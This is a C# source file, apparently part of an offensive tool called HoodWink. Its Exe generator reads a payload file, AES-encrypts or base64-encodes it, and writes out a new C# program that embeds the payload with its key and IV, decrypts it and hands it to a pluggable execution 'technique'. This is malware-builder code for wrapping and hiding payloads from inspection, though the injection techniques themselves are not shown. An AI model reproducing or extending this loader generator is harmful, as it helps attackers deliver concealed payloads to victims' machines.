using HoodWink.Services;
using System;
using System.IO;
using System.Text;

namespace HoodWink.Languages.Csharp.Generators
{
    public class Exe : Models.Base.Generator
    {
        public override string Description => "Default Generator for Exe";
        public override string ProjectPath => throw new NotImplementedException(); // Not Used
        public override string Gen(ref string targetSourcePath, ref string file, ref Models.Base.FormatExe formatInstance, ref Models.Base.Technique techniqueInstance, ref string protection, ref Models.Base.Protections protectionInstance, ref Models.Base.Extras extraInstance)
        {
            string generatedPath = null;
            string newLine = "\n";
            string tab = "\t";

            // Generate File
            try
            {
                // Using                
                StringBuilder gen = new StringBuilder();
                gen.Append(formatInstance.Using);
                gen.Append(newLine);
                gen.Append(extraInstance.Using);
                gen.Append(newLine);
                gen.Append(protectionInstance.Using);
                gen.Append(newLine);
                gen.Append(techniqueInstance.Using);
                gen.Append(newLine);
                gen.Append(newLine);

                // Namespace and Class Header
                gen.Append(formatInstance.NamespaceAndClassHeader);
                gen.Append(newLine);

                // Api Imports
                gen.Append(techniqueInstance.ApiImports);
                gen.Append(newLine);

                // Main Header
                gen.Append(formatInstance.MainHeader);
                gen.Append(newLine);

                // Main Logic
                gen.Append(formatInstance.MainBody);
                gen.Append(newLine);
                
                // Protection
                byte[] payload = File.ReadAllBytes(file);
                if (protection != "None")
                {
                    string encryptedPayload = CryptoService.Encrypt(payload, out string keyBase64, out string ivBase64);
                    //Console.WriteLine($"Decrypted : {BitConverter.ToString(CryptoService.Decrypt(encryptedPayload, keyBase64, ivBase64))}");   // Debug
                    //Console.WriteLine($"Decrypted : {Encoding.UTF8.GetString(CryptoService.Decrypt(encryptedPayload, keyBase64, ivBase64))}"); // Debug
                    gen.Append($"string b64 = \"{encryptedPayload}\";");
                    gen.Append(newLine);
                    gen.Append($"string key = \"{keyBase64}\";");
                    gen.Append(newLine);
                    gen.Append($"string iv  = \"{ivBase64}\";");
                    gen.Append(newLine);
                }
                else // No Protection
                {
                    string encryptedPayload = CryptoService.Encode(payload);
                    gen.Append($"string b64 = \"{encryptedPayload}\";");
                    gen.Append(newLine);
                }
                gen.Append(extraInstance.MainLogic);
                gen.Append(newLine);
                gen.Append(protectionInstance.MainLogic); // decryption happens here
                gen.Append(newLine);
                gen.Append(techniqueInstance.MainLogic); // uses decrypted payload
                gen.Append(newLine);
                gen.Append(newLine);

                // Main Footer
                gen.Append(formatInstance.MainFooter);
                gen.Append(newLine);
                gen.Append(newLine);

                // Additional Functions
                gen.Append(extraInstance.AdditionalFunctions);
                gen.Append(newLine);
                gen.Append(protectionInstance.AdditionalFunctions);
                gen.Append(newLine);
                gen.Append(techniqueInstance.AdditionalFunctions);
                gen.Append(newLine);

                // Namespace and Class Header
                gen.Append(formatInstance.NamespaceAndClassFooter);
                gen.Append(newLine);

                // Save to file
                File.WriteAllText(targetSourcePath, gen.ToString());
                // return path
                generatedPath = targetSourcePath;
            }
            catch (Exception ex)
            {
                WriteService.Error(ex.Message);
            }

            return generatedPath;
        }
    }
}